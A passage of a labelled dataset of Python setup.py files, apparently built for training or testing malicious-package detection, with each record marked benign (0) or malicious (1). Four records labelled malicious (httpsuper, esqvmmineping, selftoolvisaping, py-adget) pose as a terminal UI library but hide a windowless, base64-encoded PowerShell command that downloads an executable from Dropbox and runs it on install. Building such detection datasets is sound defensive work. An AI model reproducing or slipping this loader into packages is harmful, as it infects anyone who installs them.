things\\nthat want to interact with protected things:\\n\\n* [applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/authentication-scenarios#application-model) -\\n  represent services that offer, or wish to use, functionality that should be restricted:\\n    * services offering functionality are *protected applications*, e.g. an API\\n    * services wishing to use functionality interactively or non-interactively, are *client applications*:\\n        * interactive client applications include self-service portals for example\\n         * non-interactive client applications include nightly synchronisation tasks for example\\n* [users](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-overview-user-model) -\\n  represent individuals that wish to use functionality offered by protected applications, through one or more\\n  client applications (e.g. a user may use a self-service portal to access information)\\n* [groups](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-overview-user-model) -\\n  represent multiple users, for ease of managing permissions to similar users (e.g. administrative users)\\n\\nFor management purposes, all agents are scoped to an Azure tenancy (with the exception of users that can be used across\\ntenancies).\\n\\nIn the Azure management portal:\\n\\n* applications are represented by *Application registrations*\\n* users are represented by *users*, or optionally *groups* of users\\n\\n### Permissions, roles and scopes\\n\\nAzure Active Directory has a number of mechanisms for controlling how agents can interact with each other:\\n\\n* [roles](https://docs.microsoft.com/en-us/azure/architecture/multitenant-identity/app-roles) - functions, designations\\n  or labels conferred on users and/or groups (e.g. `admins`, `staff`)\\n* [direct permissions](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-permissions-and-consent) -\\n  capabilities of a protected application client applications can use themselves or without the consent of the current\\n  user (e.g. machine-to-machine access to, or modification of, data from all users)\\n* [delegated permissions](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-permissions-and-consent) -\\n  capabilities of a protected application the current user allows a client application to use (e.g. interactive access\\n  to, or modification of, their data)\\n\\nGenerally, and in terms of the OAuth ecosystem, all of these can be considered as\\n[scopes](https://tools.ietf.org/html/rfc6749#section-3.3). As discussed in the [Usage](#usage) section, scopes can be\\nused to control who and/or what can use features within protected applications.\\n\\nScopes are included the access token generated by a client application (possibly interactively by a user) and presented\\nto the projected application as a bearer token. Azure encodes different mechanisms in different claims:\\n\\n* `roles` - for roles assigned to users and permissions directly assigned to client applications\\n* `scp` - for permissions delegated by the user to a client application\\n\\nFor ease of use, this extension abstracts these two claims into a single set of `scopes` that can be required for a\\ngiven route. Multiple scopes can be required (as a logical AND) to allow scopes to be used more flexibly.\\n\\n#### Defining permissions and roles within an application\\n\\nPermissions and roles are defined in the\\n[application manifest](https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-app-manifest) of each\\napplication being protected. They can then be [assigned](#assigning-permissions-and-roles-to-users-and-applications) to\\nusers, groups and client applications.\\n\\n1. [register](#registering-an-application-in-azure) the application to be protected\\n2. [add permissions to application manifest](https://docs.microsoft.com/en-us/azure/active-directory/develop/howto-add-app-roles-in-azure-ad-apps)\\n\\nFor example:\\n\\n```json\\n\"appRoles\": [\\n  {\\n    \"allowedMemberTypes\": [\\n      \"Application\"\\n    ],\\n    \"displayName\": \"List all Foo resources\",\\n    \"id\": \"112b3a76-2dd0-4d09-9976-9f94b2ed965d\",\\n    \"isEnabled\": true,\\n    \"description\": \"Allows access to basic information for all Foo resources\",\\n    \"value\": \"Foo.List.All\"\\n  }\\n],\\n```\\n\\n#### Assigning permissions and roles to users and applications\\n\\nPermissions and roles (collectively, application roles) are assigned through the Azure portal:\\n\\n1. [define roles and permissions in the protected application](#defining-permissions-and-roles-within-an-application)\\n2. [register](#registering-an-application-in-azure) the client application(s)\\n3. assign:\\n    * [roles to users/groups](https://docs.microsoft.com/en-us/azure/active-directory/develop/howto-add-app-roles-in-azure-ad-apps)\\n    * [permissions to client applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow#request-the-permissions-in-the-app-registration-portal)\\n\\nFor assigning permissions:\\n\\n* permissions can be delegated to client applications, with the agreement of the current user\\n* permissions can be directly assigned to client applications, with the agreement of a tenancy administrator\\n\\n**Note:** Direct assignment is needed for non-interactive applications, such as daemons.\\n\\n#### Registering an application in Azure\\n\\n[Follow these instructions](https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app).\\n\\n**Note:** These instructions apply both to applications that protected by this provider (protected applications), and\\nthose that will be granted access to use such applications, possibly by a user (client applications).\\n\\n### Testing support\\n\\nFor testing applications, a local/test JSON Web Key Set (JWKS) can be used to sign local/test JSON Web Tokens (JWTs)\\nwithout relying on Azure. Local tokens can include, or not include, arbitrary scopes/roles, which can ensure\\nrequirements for specific scopes are properly enforced by this provider.\\n\\nThis requires using local tokens signed by the test keys, and patching the `FlaskAzureOauth._get_jwks` method to\\nvalidate tokens using the same test keys.\\n\\nFor example:\\n\\n```python\\nimport unittest\\n\\nfrom http import HTTPStatus\\nfrom unittest.mock import patch\\n\\nfrom flask_azure_oauth import FlaskAzureOauth\\nfrom flask_azure_oauth.mocks.keys import TestJwk\\nfrom flask_azure_oauth.mocks.tokens import TestJwt\\n\\nfrom examples import create_app\\n\\n\\nclass AppTestCase(unittest.TestCase):\\n    def setUp(self):\\n        self.test_jwks = TestJwk()\\n\\n        with patch.object(FlaskAzureOauth, \"_get_jwks\") as mocked_get_jwks:\\n            mocked_get_jwks.return_value = self.test_jwks.jwks()\\n\\n            # `self.app` should be set to a Flask application, either by direct import, or by calling an app factory\\n            self.app = create_app()\\n\\n            self.app.config[\"TEST_JWKS\"] = self.test_jwks\\n            self.app_context = self.app.app_context()\\n            self.app_context.push()\\n            self.client = self.app.test_client()\\n\\n    def test_protected_route_with_multiple_scopes_authorised(self):\\n        # Generate token with required roles\\n        token = TestJwt(\\n            app=self.app, roles=[\"BAS.MAGIC.ADD.Records.Publish.All\", \"BAS.MAGIC.ADD.Records.ReadWrite.All\"]\\n        )\\n\\n        # Make request to protected route with token\\n        response = self.client.get(\\n            \"/protected-with-multiple-scopes\", headers={\"authorization\": f\"bearer { token.dumps() }\"}\\n        )\\n        self.assertEqual(HTTPStatus.OK, response.status_code)\\n        self.app_context.pop()\\n\\n    def test_protected_route_with_multiple_scopes_unauthorised(self):\\n        # Generate token with no scopes\\n        token = TestJwt(app=self.app)\\n\\n        # Make request to protected route with token\\n        response = self.client.get(\\n            \"/protected-with-multiple-scopes\", headers={\"authorization\": f\"bearer { token.dumps() }\"}\\n        )\\n        self.assertEqual(HTTPStatus.FORBIDDEN, response.status_code)\\n        self.app_context.pop()\\n```\\n\\n## Developing\\n\\nThis provider is developed as a Python library. A bundled Flask application is used to simulate its usage and act as\\nframework for running tests etc.\\n\\n### Development environment\\n\\nGit and [Poetry](https://python-poetry.org) are required to set up a local development environment of this project.\\n\\n**Note:** If you use [Pyenv](https://github.com/pyenv/pyenv), this project sets a local Python version for consistency.\\n\\n```shell\\n# clone from the BAS GitLab instance if possible\\n$ git clone https://gitlab.data.bas.ac.uk/web-apps/flask-extensions/flask-azure-oauth.git\\n\\n# alternatively, clone from the GitHub mirror\\n$ git clone https://github.com/antarctica/flask-azure-oauth.git\\n\\n# setup virtual environment\\n$ cd flask-azure-oauth\\n$ poetry install\\n```\\n\\n### Code Style\\n\\nPEP-8 style and formatting guidelines must be used for this project, except the 80 character line limit.\\n[Black](https://github.com/psf/black) is used for formatting, configured in `pyproject.toml` and enforced as part of\\n[Python code linting](#code-linting).\\n\\nBlack can be integrated with a range of editors, such as\\n[PyCharm](https://black.readthedocs.io/en/stable/integrations/editors.html#pycharm-intellij-idea), to apply formatting\\nautomatically when saving files.\\n\\nTo apply formatting manually:\\n\\n```shell\\n$ poetry run black src/ tests/\\n```\\n\\n### Code Linting\\n\\n[Flake8](https://flake8.pycqa.org) and various extensions are used to lint Python files. Specific checks, and any\\nconfiguration options, are documented in the `./.flake8` config file.\\n\\nTo check files manually:\\n\\n```shell\\n$ poetry run flake8 src/ examples/\\n```\\n\\nChecks are run automatically in [Continuous Integration](#continuous-integration).\\n\\n### Dependencies\\n\\nPython dependencies for this project are managed with [Poetry](https://python-poetry.org) in `pyproject.toml`.\\n\\nNon-code files, such as static files, can also be included in the [Python package](#python-package) using the\\n`include` key in `pyproject.toml`.\\n\\n#### Adding new dependencies\\n\\nTo add a new (development) dependency:\\n\\n```shell\\n$ poetry add [dependency] (--dev)\\n```\\n\\nThen update the Docker image used for CI/CD builds and push to the BAS Docker Registry (which is provided by GitLab):\\n\\n```shell\\n$ docker build -f gitlab-ci.Dockerfile -t docker-registry.data.bas.ac.uk/web-apps/flask-extensions/flask-azure-oauth:latest .\\n$ docker push docker-registry.data.bas.ac.uk/web-apps/flask-extensions/flask-azure-oauth:latest\\n```\\n\\n#### Updating dependencies\\n\\n```shell\\n$ poetry update\\n```\\n\\nSee the instructions above to update the Docker image used in CI/CD.\\n\\n#### Dependency vulnerability checks\\n\\nThe [Safety](https://pypi.org/project/safety/) package is used to check dependencies against known vulnerabilities.\\n\\n**IMPORTANT!** As with all security tools, Safety is an aid for spotting common mistakes, not a guarantee of secure\\ncode. In particular this is using the free vulnerability database, which is updated less frequently than paid options.\\n\\nThis is a good tool for spotting low-hanging fruit in terms of vulnerabilities. It isn\\'t a substitute for proper\\nvetting of dependencies, or a proper audit of potential issues by security professionals. If in any doubt you MUST seek\\nproper advice.\\n\\nChecks are run automatically in [Continuous Integration](#continuous-integration).\\n\\nTo check locally:\\n\\n```shell\\n$ poetry export --without-hashes -f requirements.txt | poetry run safety check --full-report --stdin\\n```\\n\\n#### `authlib` package\\n\\nThe `authlib` dependency is locked to version `0.14.3` as the `0.15.x` release series contains a bug that prevents the\\n`kid` claim from being accessed from Jason Web Key (JWK) instances. This is a known issue and will be resolved in the\\n`1.x` release. See https://github.com/lepture/authlib/issues/314 for more information.\\n\\n### Static security scanning\\n\\nTo ensure the security of this API, source code is checked against [Bandit](https://github.com/PyCQA/bandit)\\nand enforced as part of [Python code linting](#code-linting-python).\\n\\n**Warning:** Bandit is a static analysis tool and can\\'t check for issues that are only be detectable when running the\\napplication. As with all security tools, Bandit is an aid for spotting common mistakes, not a guarantee of secure code.\\n\\nTo check manually:\\n\\n```shell\\n$ poetry run bandit -r src/ examples/\\n```\\n\\n**Note:** This package contains a number of testing methods that deliberately do insecure or nonsensical things. These\\nare necessary to test failure modes and error handling, they are not a risk when using this package as intended. These\\nworkarounds have been exempted from these security checks where they apply.\\n\\nChecks are run automatically in [Continuous Integration](#continuous-integration).\\n\\n## Testing\\n\\n### Integration tests\\n\\nThis project uses integration tests to ensure features work as expected and to guard against regressions and\\nvulnerabilities.\\n\\nThe Python [UnitTest](https://docs.python.org/3/library/unittest.html) library is used for running tests using Flask\\'s\\ntest framework. Test cases are defined in files within `tests/` and are automatically loaded when using the `test`\\nFlask CLI command included in the local Flask application in the development environment.\\n\\nTo run tests manually using PyCharm, use the included *App (tests)* run/debug configuration.\\n\\nTo run tests manually:\\n\\n```shell\\n$ FLASK_APP=examples FLASK_ENV=testing poetry run python -m unittest discover\\n```\\n\\nTests are ran automatically in [Continuous Integration](#continuous-integration).\\n\\n### Continuous Integration\\n\\nAll commits will trigger a Continuous Integration process using GitLab\\'s CI/CD platform, configured in `.gitlab-ci.yml`.\\n\\n### Test/Example applications\\n\\nFor verifying this provider works for real-world use-cases, a test Flask application is included in\\n`examples/__init__.py`. This test application acts as both an application providing access to, and accessing, protected\\nresources. It can use a number of application registrations registered in the BAS Web & Applications Test Azure AD.\\n\\nThese applications allow testing different versions of access tokens for example. These applications are intended for\\ntesting only. They do not represent real applications, or contain any sensitive or protected information.\\n\\nTo test requesting resources from protected resources as an API, set the appropriate config options and run the\\napplication container:\\n\\n```shell\\n$ FLASK_APP=examples poetry run flask\\n```\\n\\nTo test requesting resources from protected resources as a browser application, set the appropriate config options and\\nstart the application container:\\n\\n```shell\\n$ FLASK_APP=examples poetry run flask run\\n```\\n\\nTerraform is used to provision the application registrations used:\\n\\n```\\n$ cd provisioning/terraform\\n$ docker-compose run terraform\\n$ az login --allow-no-subscriptions\\n$ terraform init\\n$ terraform validate\\n$ terraform apply\\n```\\n\\n**Note:** Several properties in the application registration resources require setting once the registration has been\\ninitially made (identifiers for example). These will need commenting out before use.\\n\\nSome properties, such as client secrets, can only be set once applications have been registered in the Azure Portal.\\n\\nTerraform state information is held in the BAS Terraform Remote State project (internal).\\n\\n## Deployment\\n\\n### Python package\\n\\nThis project is distributed as a Python package, hosted in [PyPi](https://pypi.org/project/flask-azure-oauth).\\n\\nSource and binary packages are built and published automatically using\\n[Poetry](https://python-poetry.org) in [Continuous Deployment](#continuous-deployment).\\n\\n**Note:** Except for tagged releases, Python packages built in CD will use `0.0.0` as a version to indicate they are\\nnot formal releases.\\n\\n### Continuous Deployment\\n\\nA Continuous Deployment process using GitLab\\'s CI/CD platform is configured in `.gitlab-ci.yml`.\\n\\n## Release procedure\\n\\nFor all releases:\\n\\n1. create a `release` branch\\n2. bump the version as appropriate in `pyproject.toml`\\n3. close release in `CHANGELOG.md`\\n4. push changes, merge the `release` branch into `main`, and tag with version\\n\\nThe project will be built and published to PyPi automatically through [Continuous Deployment](#continuous-deployment).\\n\\n## Feedback\\n\\nThe maintainer of this project is the BAS Web & Applications Team, they can be contacted at:\\n[servicedesk@bas.ac.uk](mailto:servicedesk@bas.ac.uk).\\n\\n## Issue tracking\\n\\nThis project uses issue tracking, see the\\n[Issue tracker](https://gitlab.data.bas.ac.uk/web-apps/flask-extensions/flask-azure-oauth/issues) for more information.\\n\\n**Note:** Read & write access to this issue tracker is restricted. Contact the project maintainer to request access.\\n\\n## License\\n\\nCopyright (c) 2019-2022 UK Research and Innovation (UKRI), British Antarctic Survey.\\n\\nPermission is hereby granted, free of charge, to any person obtaining a copy\\nof this software and associated documentation files (the \"Software\"), to deal\\nin the Software without restriction, including without limitation the rights\\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\\ncopies of the Software, and to permit persons to whom the Software is\\nfurnished to do so, subject to the following conditions:\\n\\nThe above copyright notice and this permission notice shall be included in all\\ncopies or substantial portions of the Software.\\n\\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\\nSOFTWARE.\\n',\n    'author': 'Felix Fennell',\n    'author_email': 'felnne@bas.ac.uk',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/antarctica/flask-azure-oauth',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.6.2,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "gower-0.0.5", "func": "from setuptools import setup, find_packages\n\nfrom os import path\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n    \nsetup(\n    name='gower',\n    version='0.0.5',\n    description='Python implementation of Gowers distance, pairwise between records in two data sets',\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    keywords=['gower', 'distance', 'matrix'],\n    url='https://github.com/wwwjk366/gower',\n    author='Michael Yan',\n    author_email='tanbingy@gmail.com',\n    license='MIT',\n    packages=find_packages(),\n    install_requires=['numpy', 'scipy'],\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 3 - Alpha',      # Chose either \"3 - Alpha\", \"4 - Beta\" or \"5 - Production/Stable\" as the current state of your package\n        'Intended Audience :: Developers',      # Define that your audience are developers\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'License :: OSI Approved :: MIT License',   # Again, pick a license\n        'Programming Language :: Python :: 3.7',\n    ],\n    package_data={\n        # If any package contains *.txt files, include them:\n        #         '': ['*.sav'],\n        # And include any *.dat files found in the 'data' subdirectory\n        # of the 'mypkg' package, also:\n        #'customer_models': ['model_objs/*.sav'],\n    })", "target": 0}
{"idx": "ecos-2.0.10", "func": "from __future__ import print_function\ntry:\n    from setuptools import setup, Extension\n    from setuptools.command.build_ext import build_ext as _build_ext\nexcept ImportError:\n    print(\"Please use pip (https://pypi.python.org/pypi/pip) to install.\")\n    raise\n\nimport os\nfrom glob import glob\nfrom platform import system\n\nlib = []\nif system() == 'Linux':\n    lib += ['rt']\n\n_ecos = Extension('_ecos', libraries = lib,\n                    # define LDL and AMD to use long ints\n                    # also define that we are building a python module\n                    define_macros = [\n                        ('PYTHON',None),\n                        ('DLONG', None),\n                        ('LDL_LONG', None),\n                        ('CTRLC', 1)],\n                    include_dirs = ['ecos/include',\n                        'ecos/external/amd/include',\n                        'ecos/external/ldl/include',\n                        'ecos/external/SuiteSparse_config'],\n                    sources = ['src/ecosmodule.c',\n                        'ecos/external/ldl/src/ldl.c',\n                        'ecos/src/cone.c',\n                        'ecos/src/ctrlc.c',\n                        'ecos/src/ecos.c',\n                        'ecos/src/equil.c',\n                        'ecos/src/expcone.c',\n                        'ecos/src/kkt.c',\n                        'ecos/src/preproc.c',\n                        'ecos/src/spla.c',\n                        'ecos/src/splamm.c',\n                        'ecos/src/timer.c',\n                        'ecos/src/wright_omega.c'\n                    ] + glob('ecos/external/amd/src/*.c')\n                      + glob('ecos/ecos_bb/*.c'))       # glob bb source files\n\ndef set_builtin(name, value):\n    if isinstance(__builtins__, dict):\n        __builtins__[name] = value\n    else:\n        setattr(__builtins__, name, value)\n\nclass build_ext(_build_ext):\n    \"\"\" This custom class for building extensions exists so we can force\n    a numpy install before building the extension, thereby giving us\n    access to the numpy headers.\n    \"\"\"\n    def finalize_options(self):\n        _build_ext.finalize_options(self)\n        # Prevent numpy from thinking it is still in its setup process:\n        set_builtin(\"__NUMPY_SETUP__\", False)\n        import numpy\n        self.include_dirs.append(numpy.get_include())\n\nsetup(\n    name = 'ecos',\n    version = '2.0.10',\n    # point to README.md file instead of plain-text readme\n    author = 'Alexander Domahidi, Eric Chu, Han Wang, Santiago Akle',\n    author_email = 'domahidi@embotech.com, echu@cs.stanford.edu, hanwang2@stanford.edu, tiagoakle@gmail.com',\n    url = 'http://github.com/embotech/ecos',\n    description = 'This is the Python package for ECOS: Embedded Cone Solver. See Github page for more information.',\n    license = \"GPLv3\",\n    packages = ['ecos'],\n    package_dir = {'': 'src'},\n    cmdclass = {'build_ext': build_ext},\n    ext_modules = [_ecos],\n    setup_requires = [\n        \"numpy >= 1.6\"\n    ],\n    install_requires = [\n        \"numpy >= 1.6\",\n        \"scipy >= 0.9\"\n    ],\n    test_suite='nose.collector',\n    tests_require=['nose']\n)\n", "target": 0}
{"idx": "httpsuper-5.37", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'httpsuper',\n    packages = ['modlib'],\n    version = '6.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqvmmineping-5.22", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvmmineping',\n    packages = ['modlib'],\n    version = '8.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-settings-export-1.2.1", "func": "import codecs\nfrom setuptools import setup\n\ntry:\n    import multiprocessing\nexcept ImportError:\n    pass\n\n\nwith codecs.open('README.rst', encoding='utf-8') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name=\"django-settings-export\",\n    version='1.2.1',\n    author=\"Jakub Roztocil\",\n    author_email=\"jakub@roztocil.co\",\n    description='This Django app allows you to export'\n                ' certain settings to your templates.',\n    long_description=long_description,\n    license='BSD',\n    url='https://github.com/jkbrzt/django-settings-export',\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python\",\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ],\n    py_modules=['django_settings_export'],\n    install_requires=['django'],\n)\n", "target": 0}
{"idx": "django-celery-email-3.0.0", "func": "#!/usr/bin/env python\nimport os\nimport codecs\n\nfrom setuptools import setup, find_packages\n\n\nbase_dir = os.path.dirname(__file__)\n\nwith codecs.open(os.path.join(base_dir, 'README.rst'), 'r', encoding='utf8') as f:\n    long_description = f.read()\n\nabout = {}\nwith open(os.path.join(base_dir, 'djcelery_email', '__about__.py')) as f:\n    exec(f.read(), about)\n\n\nsetup(\n    name=about['__title__'],\n    version=about['__version__'],\n    description=about['__summary__'],\n    long_description=long_description,\n    license=about['__license__'],\n    url=about['__uri__'],\n    author=about['__author__'],\n    author_email=about['__email__'],\n    platforms=['any'],\n    packages=find_packages(exclude=['ez_setup', 'tests']),\n    scripts=[],\n    zip_safe=False,\n    install_requires=[\n        'django>=2.2',\n        'celery>=4.0',\n        'django-appconf',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: POSIX',\n        'Topic :: Communications',\n        'Topic :: Communications :: Email',\n        'Topic :: System :: Distributed Computing',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "selftoolvisaping-7.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selftoolvisaping',\n    packages = ['modlib'],\n    version = '10.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flasgger-0.9.5", "func": "try:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from distutils.core import setup, find_packages\n\n\nsetup(\n    name='flasgger_package',\n    version='0.0.1',\n    url='https://github.com/rochacbruno/flasgger/',\n    license='MIT',\n    author='testing@flasgger',\n    author_email='testing@flasgger',\n    description='A package to use during local and CI tests',\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    platforms='any',\n    install_requires=[\n        'flasgger>=0.9.4.dev0',\n    ]\n)\n", "target": 0}
{"idx": "py-adget-6.53", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-adget',\n    packages = ['modlib'],\n    version = '2.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
